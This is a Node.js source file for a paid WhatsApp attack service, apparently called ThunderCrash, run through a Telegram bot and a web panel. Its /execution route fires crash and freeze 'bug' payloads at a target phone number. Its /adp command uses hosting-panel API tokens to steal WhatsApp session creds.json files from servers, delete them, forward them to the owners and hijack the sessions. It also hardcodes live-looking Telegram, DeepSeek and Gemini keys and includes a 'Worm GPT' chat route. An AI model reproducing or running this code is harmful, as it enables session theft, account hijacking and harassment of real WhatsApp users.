  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @ZanssMods");
  }

  // 3. Validasi Format Input
  if (!args || !args.includes(",")) {
    return ctx.reply(
      "<blockquote> Tutorial Cara Create Account</blockquote>\n" +
      "1. Ketik /addakun\n" +
      "2. Format: username,durasi,role,customKey\n" +
      "3. Contoh: /CreateAccount Fahri,30d,owner,Stecu", 
      { parse_mode: "HTML" }
    );
  }

  // --- PARSING INPUT ---
  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  
  // [ANTI ERROR] Definisikan roleInput DISINI agar terbaca sampai bawah
  // Jika user tidak isi role (kosong), otomatis jadi "user"
  const roleInput = parts[2] ? parts[2].trim().toLowerCase() : "user";
  
  const customKey = parts[3] ? parts[3].trim() : null;

  // 4. Validasi Durasi
  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  // 5. Generate Key & Expired
  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  // 6. Simpan ke Database (Termasuk Role)
  const userIndex = users.findIndex(u => u.username === username);
  const userData = { 
      username, 
      key, 
      expired, 
      role: roleInput // Menyimpan role agar connect ke Web Dashboard
  };

  if (userIndex !== -1) {
    users[userIndex] = userData;
  } else {
    users.push(userData);
  }

  saveUsers(users);

  // Format Tanggal untuk pesan
  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // 7. Kirim Pesan Sukses
  try {
    await ctx.reply("💢 Succesfull Create Your Account");
    
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[{ text: "! Chanel ☇ Apps", url: "https://t.me/Keiraa_About" }]]
      }
    };

    await ctx.telegram.sendMessage(
      ctx.from.id,
      `<blockquote>⚙️ Account Succesfull Create </blockquote>\n` +
      `<b>📢 System Sudah Membuat Akun Untuk anda Harap Login Ke akun Anda, Jika Ada Masalah? Hubungi @ZanssMods</b>\n\n` +
      `<blockquote>📊 DATA ACCOUNT !!</blockquote>\n` +
      `<b>👤Username:</b> ${username}\n` +
      `<b>🏷️Role:</b> ${roleInput.toUpperCase()}\n` + 
      `<b>🛡️Password:</b> <code>${key}</code>\n` +
      `<b>⌛Berlaku:</b> <b>${expiredStr}</b> WIB\n` +
      `<blockquote>‼️ Note Dan Aturan</blockquote>\n` +
      `-Jangan Share Pw And Usn Secara Free !!\n` +
      `-Wajib Join Chanel !!`,
      { parse_mode: "HTML", ...keyboard }
    );
  } catch (error) {
    console.log(error);
    await ctx.reply(
      "✓ Key berhasil dibuat! Namun saya tidak bisa mengirim pesan private kepada Anda.\n\n" +
      "Silakan mulai chat dengan saya terlebih dahulu, lalu gunakan command ini lagi.",
      { parse_mode: "HTML" }
    );
  }
});

bot.command('addpesan', (ctx) => {
    const userId = ctx.from.id.toString();
    
    // 1. Validasi Akses (Hanya Owner & Authorized)
    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("❌ Akses Ditolak. Fitur khusus Owner/Admin.");
    }

    // 2. Ambil Isi Pesan (Mengambil semua teks setelah command)
    // Format: /addpesan Isi Pesan Bebas
    const messageContent = ctx.message.text.split(' ').slice(1).join(' ');
    
    // Cek jika pesan kosong
    if (!messageContent) {
        return ctx.reply(
            "⚠️ *Format Salah!*\n\n" +
            "Gunakan: `/addpesan <Isi Pesan>`\n" +
            "Contoh: `/addpesan Halo member, ada update fitur baru!`", 
            { parse_mode: 'Markdown' }
        );
    }

    // 3. Ambil Database User
    const users = getUsers();
    if (users.length === 0) {
        return ctx.reply("❌ Database user kosong. Belum ada akun yang dibuat.");
    }

    // 4. PROSES BROADCAST KE SEMUA USER
    let successCount = 0;
    const timestamp = Date.now();
    const senderName = ctx.from.first_name || "Admin";

    users.forEach((user, index) => {
        // Buat ID unik untuk setiap pesan
        const msgId = `${timestamp}_${index}`; 
        
        // Push ke Global Messages
        globalMessages.push({
            id: msgId,
            to: user.username,  // <-- Dikirim ke masing-masing username
            from_id: userId,    // ID Telegram Pengirim
            sender_name: senderName,
            content: messageContent,
            timestamp: timestamp,
            read: false,
            replied: false
        });

        successCount++;
    });

    // 5. Laporan Sukses
    ctx.reply(
        `✅ *BROADCAST BERHASIL*\n\n` +
        `💬 Pesan: _${messageContent}_\n` +
        `👥 Penerima: *${successCount}* User\n` +
        `🚀 Status: Terkirim ke Dashboard semua user`, 
        { parse_mode: 'Markdown' }
    );
});

bot.command("listakun", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers(); 

  // Validasi Akses Owner
  if (!isOwner(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner.", { parse_mode: "HTML" });
  }

  if (users.length === 0) return ctx.reply("💢 Belum ada akun yang dibuat.");

  let teks = `<blockquote>☘️ All Account Apps ThunderCrash</blockquote>\n\n`;

  users.forEach((u, i) => {
    // 1. Ambil Role (Safe Check)
    const userRole = u.role ? u.role.toLowerCase() : "user";
    let roleDisplay = "USER";
    let roleIcon = "👤";

    // Mapping Role
    switch (userRole) {
      case "owner": case "creator":
        roleDisplay = "OWNER"; roleIcon = "👑"; break;
      case "admin":
        roleDisplay = "ADMIN"; roleIcon = "👮"; break;
      case "reseller": case "resell":
        roleDisplay = "RESELLER"; roleIcon = "💼"; break;
      case "moderator": case "mod":
        roleDisplay = "MODERATOR"; roleIcon = "🛡️"; break;
      case "vip":
        roleDisplay = "VIP"; roleIcon = "💎"; break;
      case "pt":
        roleDisplay = "PARTNER"; roleIcon = "🤝"; break;
      default:
        roleDisplay = "MEMBER"; roleIcon = "👤"; break;
    }

    // 2. LOGIKA SENSOR PASSWORD (PERBAIKAN ERROR DISINI)
    // Kita pastikan 'u.key' ada isinya. Jika kosong, pakai string kosong.
    const rawKey = u.key ? u.key.toString() : "???"; 
    
    let maskedKey = "";
    if (rawKey === "???") {
        maskedKey = "-(Rusak/No Key)-";
    } else if (rawKey.length <= 5) {
      // Jika pendek, sensor semua
      maskedKey = "•".repeat(rawKey.length);
    } else {
      // Jika panjang, sensor tengah
      const start = rawKey.slice(0, 2);
      const end = rawKey.slice(-2);
      maskedKey = `${start}•••••${end}`;
    }

    // 3. Format Tanggal
    // Tambahkan cek juga takutnya expired undefined
    const expTime = u.expired || Date.now(); 
    const exp = new Date(expTime).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit", 
      hour: "2-digit", minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    // 4. Susun Pesan
    teks += `<b>${i + 1}. ${u.username}</b> [ ${roleIcon} ${roleDisplay} ]\n`;
    teks += `   🔑 Key: <code>${maskedKey}</code>\n`;
    teks += `   ⌛ Exp: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks, { parse_mode: "HTML" });
});

bot.command("delakun", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey taitan");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});


// Harus ada di scope: axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot
bot.command("adp", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3)
    return ctx.reply(
      "Format salah\nContoh: /adp http://domain.com plta_xxxx pltc_xxxx"
    );

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      let credsBuffer = null;
      let usedPath = null;

      // 🔹 Coba download creds.json dari lokasi umum
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, {
              responseType: "arraybuffer",
            });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
            break;
          }
        } catch (e) {
          // skip ke path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // 🔹 AUTO HAPUS creds.json dari server setelah berhasil di-download
      try {
        await axios.post(
          `${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(
          `[WARN] Gagal hapus creds.json di server ${identifier}: ${
            err.response?.status || err.message
          }`
        );
      }

      // 🔹 Parse nomor WA
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // 🔹 Simpan creds lokal
      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch (e) {
        console.error("Gagal simpan creds:", e.message);
      }

      // 🔹 Kirim file ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
          await ctx.telegram.sendMessage(
            oid,
            `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // 🔹 Coba connect sekali
      try {
        if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
          console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        const emsg =
          err?.response?.status === 404
            ? "404 Not Found"
            : err?.response?.status === 403
            ? "403 Forbidden"
            : err?.response?.status === 440
            ? "440 Login Timeout"
            : err?.message || "Unknown error";

        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
              { parse_mode: "Markdown" }
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0)
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else
      await ctx.reply(
        `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
      );
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

console.clear();
console.log(chalk.green(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⡿⣩⣾⣿⣿⣶⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⠟⣼⡿⢟⢸⣿⣿⣿⠿⢷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡏⣾⣿⡆⣾⣿⣸⣯⣿⡾⣿⢗⠿⣷⣝⣛⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣮⣭⣾⣿⡏⢿⣝⣯⣽⣶⣿⣿⣿⠿⣿⡇⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢫⣾⣿⢿⠟⣋⢿⣲⣿⡿⣟⣿⣦⣝⡻⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣮⢫⣾⣿⠀⠛⠁⣿⣿⣾⣿⣿⣿⣿⣯⣷⣪⣟⢿⣿
⣿⢿⢿⣿⣿⣿⢸⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⣝⡜⣿
⢃⡖⣼⣿⣿⣿⣏⣿⣿⣿⣿⣿⣧⡯⣽⣛⢿⠿⠿⢿⠿⠟⡛⣣⣿
⣷⣾⣾⣿⣿⡏⣝⢨⣟⡿⣿⣿⣿⣿⣮⣿⣫⡿⠿⣭⡚⣷⣴⣿⣿
⣿⠻⢿⢰⡬⣱⣝⣮⣿⣿⣿⣾⣭⣟⣻⡿⠿⠿⠿⣛⣵⣿⣿⣿⣿
⣛⠎⢟⡴⣿⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⣿⣬⣭⣭⣝⡻⢿⣿⣿⣿
⡜⣫⣿⣷⣿⣿⣼⣿⣿⣟⡿⣿⣿⣿⣿⣿⡟⠿⣿⡿⣿⣦⢻⣿⣿
⢅⣭⣿⣿⣿⣿⣼⣿⣿⣿⣽⣿⣿⣿⣿⡿⣹⣷⣝⣃⣭⣵⣿⣿⣿⠀
`));

bot.launch();
console.log(chalk.red(`
Berdiri Lah Kawannnn`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "Ini Bokep", "ZanssGG.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca ZanssGG.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "Ini Bokep", "ZanssGG.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file ZanssGG.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
    const { username, key } = req.body;
    const users = getUsers();

    // Validasi Login
    const user = users.find(u => u.username === username && u.key === key);

    if (!user) {
        return res.redirect("/login?msg=Username/Password Salah");
    }

    // Buat Cookie (Tiket Masuk) - Tahan 24 Jam
    res.cookie("sessionUser", user.username, { 
        maxAge: 86400000, // 24 jam
        httpOnly: true 
    });

    // Masuk ke Execution
    res.redirect("/execution");
});

      
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

app.get("/execution", (req, res) => {
    // --- DEBUG LOGGING (Supaya tau kenapa mental) ---
    console.log(chalk.cyan("Acces Generated, Welcome User"));
    console.log(chalk.green("Ada Yang sedang Login Bang"));
    
        // GANTI DARI SINI (Baris 1512 di gambar)
    if (!req.cookies || !req.cookies.sessionUser) {
        return res.redirect('/login');
    }

    const username = req.cookies.sessionUser;
    
    // 2. Load Database & Cari User
    const users = getUsers(); 
    const currentUser = users.find(u => u.username === username);

    if (!currentUser) {
        return res.clearCookie("sessionUser").redirect('/login');
    }

    // 3. Cek Masa Aktif
    if (currentUser.expired && Date.now() > currentUser.expired) {
         return res.redirect('/login?msg=Expired');
    }

    // ============================================================
    // [BAGIAN A] LOGIC EKSEKUSI SERANGAN
    // ============================================================
    const targetNumber = req.query.target;
    const mode = req.query.mode;

    if (targetNumber || mode) {
        // ... (Logic Maintenance & Validasi Input) ...
        if (sessions.size === 0) {
            return res.send(executionPage("🚧 MAINTENANCE SERVER !!", { message: "Tunggu maintenance selesai..." }, false, currentUser, currentUser.key, mode));
        }

        if (!targetNumber) {
            return res.send(executionPage("✓ Server ON", { message: "Masukkan nomor & mode." }, true, currentUser, currentUser.key, mode || ""));
        }
        
        // Cek Cooldown
        const now = Date.now();
        const cooldown = 3 * 60 * 1000; 
        if (typeof lastExecution !== 'undefined' && (now - lastExecution < cooldown)) {
             const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
             return res.send(executionPage("⏳ SERVER COOLDOWN", { message: `Tunggu ${sisa} detik.` }, false, currentUser, currentUser.key, ""));
        }

        const target = `${targetNumber}@s.whatsapp.net`;

        try {
            if (mode === "uisystem") StuckHome(24, target);
            else if (mode === "invis") DelayBapakLo(24, target);
            else if (mode === "fc") Forclose(24, target);
            else if (mode === "zan") BomBug(24, target);
            else throw new Error("Mode tidak dikenal.");

            lastExecution = now;
            console.log(chalk.red(`System Mendapatkan Panggilan, Bug Sedang Diluncurkan Ke ${targetNumber}`));
            
            return res.send(executionPage("✓ S U C C E S", {
                target: targetNumber,
                timestamp: new Date().toLocaleString("id-ID"),
                message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
            }, false, currentUser, currentUser.key, mode));

        } catch (err) {
            console.error(err);
            return res.send(executionPage("✗ Gagal", { target: targetNumber, message: "Error Server" }, false, currentUser, currentUser.key, mode));
        }
        return; 
    }

    // ============================================================
    // [BAGIAN B] LOGIC DASHBOARD (HTML + ROLE)
    // ============================================================
    
    // Pastikan path ini benar sesuai folder kamu
    const filePath = "./Ini Bokep/Zanss.html"; 

    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) {
            console.error("❌ Gagal baca file HTML:", err);
            return res.status(500).send("Error loading HTML file");
        }

        // --- 1. LOGIC WARNA ROLE ---
        const rawRole = (currentUser.role || 'user').toLowerCase();
        let roleHtml = "";

        switch (rawRole) {
            case "owner": case "creator":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 6px #FFFFFF;">Owner</span>'; break;
            case "admin":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;">Admin</span>'; break;
            case "reseller": case "ress":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;"> Reseller</span>'; break;
            case "pt":
                roleHtml = '<span style="color: #FFFFFF;">Partner</span>'; break;
            case "vip":
                roleHtml = '<span style="color: #FFFFFF;>VIP</span>'; break;
            case "moderator":
                roleHtml = '<span style="color: #FFFFFF;">Moderator</span>'; break;
            default:
                roleHtml = '<span style="color: #FFFFFF;">Member</span>'; break;
        }

        // --- 2. LOGIC WAKTU ---
        const timeIso = currentUser.expired ? new Date(currentUser.expired).toISOString() : new Date().toISOString();
                
        let activeConnections = 0;
        try {
            if (typeof sessions !== 'undefined') {
                activeConnections = sessions.size;
            }
        } catch (e) {
            activeConnections = 0;
        }
 
        // --- 3. REPLACE HTML ---
        // Ganti Username
        html = html.replace(/\${username}/g, currentUser.username);
        // Ganti Role
        html = html.replace(/\${displayRole}/g, roleHtml);
        // Ganti Waktu
        html = html.replace(/\${formattedTime}/g, timeIso);
        // Add Ini
        html = html.replace(/\${rawRole}/g, rawRole);
        //Add
        html = html.replace(/\${activeConnections}/g, activeConnections);
        // --- 4. KIRIM ---
        res.send(html);
    });
});
      

app.post('/api/create-account', (req, res) => {
    const { username, customKey, duration, role } = req.body;
    const adminUsername = req.cookies.sessionUser;

    if (!adminUsername) return res.json({ success: false, message: "Sesi Habis, Login Ulang!" });

    const users = getUsers();
    const adminUser = users.find(u => u.username === adminUsername);
    
    if (!adminUser) return res.json({ success: false, message: "Admin tidak ditemukan!" });

    // --- 1. VALIDASI HAK AKSES ---
    const adminRole = (adminUser.role || 'user').toLowerCase();
    const targetRole = role.toLowerCase();
    let allowed = false;

    if (adminRole === 'owner' || adminRole === 'creator') allowed = true;
    else if (adminRole === 'admin' && ['member', 'user', 'reseller', 'pt', 'admin'].includes(targetRole)) allowed = true;
    else if (adminRole === 'pt' && ['member', 'user', 'reseller', 'pt'].includes(targetRole)) allowed = true;
    else if ((adminRole === 'reseller' || adminRole === 'moderator') && ['member', 'user', 'reseller'].includes(targetRole)) allowed = true;

    if (!allowed) return res.json({ success: false, message: `Role ${adminRole} tidak boleh membuat ${targetRole}!` });

    // --- 2. VALIDASI DATA ---
    if (users.find(u => u.username === username)) return res.json({ success: false, message: "Username sudah ada!" });

    // Parse Durasi
    let ms = 30 * 24 * 60 * 60 * 1000;
    if (duration.endsWith('d')) ms = parseInt(duration) * 24 * 60 * 60 * 1000;
    else if (duration.endsWith('h')) ms = parseInt(duration) * 60 * 60 * 1000;

    const finalKey = customKey || generateKey(4); 
    const expired = Date.now() + ms;

    // --- 3. SIMPAN ---
    users.push({ username, key: finalKey, expired, role: targetRole });
    saveUsers(users);

    // 🔥 LOG KEREN DI PANEL PTERODACTYL 🔥
    console.log(`\n================================`);
    console.log(`[+] NEW ACCOUNT CREATED (WEB)`);
    console.log(` ├─ Creator : ${adminUsername} (${adminRole})`);
    console.log(` ├─ New User: ${username}`);
    console.log(` ├─ Role    : ${targetRole.toUpperCase()}`);
    console.log(` └─ Expired : ${new Date(expired).toLocaleString()}`);
    console.log(`================================\n`);

    return res.json({ success: true, message: "Berhasil" });
});


app.get('/api/list-accounts', (req, res) => {
    // Cek Login
    if (!req.cookies.sessionUser) return res.json([]);

    const users = getUsers();
    
    // Kirim data user TAPI JANGAN KIRIM PASSWORD/KEY (Privacy)
    // Urutkan dari yang terbaru dibuat (paling bawah di array = paling baru)
    const safeList = users.map(u => ({
        username: u.username,
        role: u.role || 'user',
        expired: u.expired
    })).reverse(); 

    res.json(safeList);
});


// --- API: REPLY MESSAGE (Web -> Telegram ID 8312382874) ---
app.post('/api/reply-message', async (req, res) => {
    const { msgId, replyText } = req.body;
    const username = req.cookies.sessionUser;

    if (!username) return res.json({ success: false, message: "Login dulu!" });

    // Cari pesan di database memori
    const msgIndex = globalMessages.findIndex(m => m.id === msgId);
    
    if (msgIndex === -1) return res.json({ success: false, message: "Pesan tidak ditemukan / sudah dihapus." });

    const msg = globalMessages[msgIndex];
    
    if (msg.replied) return res.json({ success: false, message: "Anda sudah membalas pesan ini." });

    // --- SETTING PENGIRIMAN ---
    const adminChatId = "7304236200"; // <--- TARGET ID KHUSUS
    const botToken = "8287710493:AAFb1ifekcPVxGH6wOQoHwFmKJHqs2nxV_A" // Token Bot Anda

    const textToSend = `📩 *BALASAN DARI WEB*\n\n👤 User: \`${username}\`\n💬 Pesan Awal: _${msg.content}_\n\n↩️ *Balasan User:* \n${replyText}`;

    try {
        // Request ke API Telegram
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: adminChatId,
                text: textToSend,
                parse_mode: "Markdown"
            })
        });

        const data = await response.json();

        if (data.ok) {
            // Tandai pesan sudah dibalas
            globalMessages[msgIndex].replied = true;
            
            return res.json({ success: true });
        } else {
            console.error("Telegram API Error:", data);
            return res.json({ success: false, message: "Gagal kirim ke Telegram" });
        }
    } catch (e) {
        console.error("Reply Error:", e);
        return res.json({ success: false, message: "Server Error saat mengirim balasan." });
    }
});

// --- FITUR AI CHAT ROUTE (WAJIB COPY KE INDEX.JS) ---
app.post("/api/ai-chat", async (req, res) => {
    const { message, modelType } = req.body;
    
    // 1. API KEYS
    const DEEPSEEK_KEY = "sk-cf3c3d988d284b2e90249a2a7d76c224";
    const GEMINI_KEY = "AIzaSyCp4_OjU05nfm03l9IGpCNOBrEYtfAfT-A";

    try {
        let replyText = "";

        if (modelType === 'worm') {
            // --- DEEPSEEK (WORM GPT) ---
            const response = await axios.post("https://api.deepseek.com/chat/completions", {
                model: "deepseek-chat",
                messages: [
                    { role: "system", content: "You are Worm GPT, a helpful assistant." },
                    { role: "user", content: message }
                ],
                stream: false
            }, {
                headers: { 
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${DEEPSEEK_KEY}` 
                }
            });
            replyText = response.data.choices[0].message.content;

        } else if (modelType === 'gemini') {
            // --- GOOGLE GEMINI 3.0 ---
            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
            const response = await axios.post(url, {
                contents: [{ parts: [{ text: message }] }]
            }, {
                headers: { "Content-Type": "application/json" }
            });
            
            if(response.data.candidates && response.data.candidates.length > 0) {
                replyText = response.data.candidates[0].content.parts[0].text;
            } else {
                replyText = "Maaf, Gemini sedang sibuk.";
            }
        }

        res.json({ success: true, reply: replyText });

    } catch (error) {
        console.error("AI Error:", error.response ? error.response.data : error.message);
        res.status(500).json({ success: false, error: "Server Error / Quota Habis" });
    }
});


app.post("/api/track-ip", async (req, res) => {
    const { ip } = req.body;
    try {
        
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        
        res.json(response.data);
    } catch (error) {
        console.error("Track Error:", error.message);
        res.status(500).json({ status: 'fail', message: "Gagal melacak IP." });
    }
});


app.get('/api/transfer', (req, res) => {
    try {
        const { sender, target, amount } = req.query;

        // Validasi
        if (!sender || !target || !amount) {
            return res.json({ status: 'error', message: 'Data tidak lengkap.' });
        }

        const jumlah = parseInt(amount);
        if (isNaN(jumlah) || jumlah <= 0) {
            return res.json({ status: 'error', message: 'Jumlah coin tidak valid.' });
        }

        // Cari ID Pengirim & Penerima berdasarkan Username
        let senderId = Object.keys(global.db.data.users).find(u => global.db.data.users[u].name === sender);
        let targetId = Object.keys(global.db.data.users).find(u => global.db.data.users[u].name === target);

        if (!senderId) return res.json({ status: 'error', message: 'Pengirim tidak ditemukan.' });
        if (!targetId) return res.json({ status: 'error', message: `Username tujuan '${target}' tidak ditemukan.` });
        if (senderId === targetId) return res.json({ status: 'error', message: 'Tidak bisa transfer ke diri sendiri.' });

        // Cek Saldo
        let senderData = global.db.data.users[senderId];
        let targetData = global.db.data.users[targetId];

        if ((senderData.coin || 0) < jumlah) {
            return res.json({ status: 'error', message: 'Saldo coin tidak mencukupi.' });
        }

        // Eksekusi
        senderData.coin -= jumlah;
        targetData.coin = (targetData.coin || 0) + jumlah;

        return res.json({
            status: 'success',
            message: 'Transfer Berhasil',
            sisaCoin: senderData.coin
        });

    } catch (e) {
        console.error(e);
        return res.json({ status: 'error', message: 'Internal Server Error' });
    }
});


app.get('/api/addcoin', (req, res) => {
    try {
        const { username, amount, key } = req.query;

        // Opsional: Tambahkan keamanan simple key agar tidak sembarang orang bisa add coin
        const SECRET_KEY = "admin123"; 
        if (key !== SECRET_KEY) {
            return res.json({ status: 'error', message: 'Unauthorized / Key Salah' });
        }

        if (!username || !amount) {
            return res.json({ status: 'error', message: 'Format: ?username=nama&amount=jumlah&key=pass' });
        }

        const jumlah = parseInt(amount);
        
        // Cari User
        let userKey = Object.keys(global.db.data.users).find(
            u => global.db.data.users[u].name === username
        );

        if (!userKey) {
            return res.json({ status: 'error', message: `User '${username}' tidak ditemukan.` });
        }

        // Tambah Coin
        global.db.data.users[userKey].coin = (global.db.data.users[userKey].coin || 0) + jumlah;

        return res.json({
            status: 'success',
            message: `Berhasil tambah ${jumlah} coin ke ${username}`,
            totalCoin: global.db.data.users[userKey].coin
        });

    } catch (e) {
        console.error(e);
        return res.json({ status: 'error', message: 'Internal Server Error' });
    }
});

// --- API: LOGOUT (Ganti yang lama dengan ini) ---
app.post('/api/logout', (req, res) => {
    const { reason } = req.body;
    const username = req.cookies.sessionUser || "Unknown";
    
    console.log(`[LOGOUT] User: ${username} | Alasan: ${reason}`);

    // Hapus Cookie
    res.clearCookie('sessionUser');
    res.clearCookie('sessionKey');
    
    return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, "0.0.0.0", () => {
  console.log("Server jalan di", PORT);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
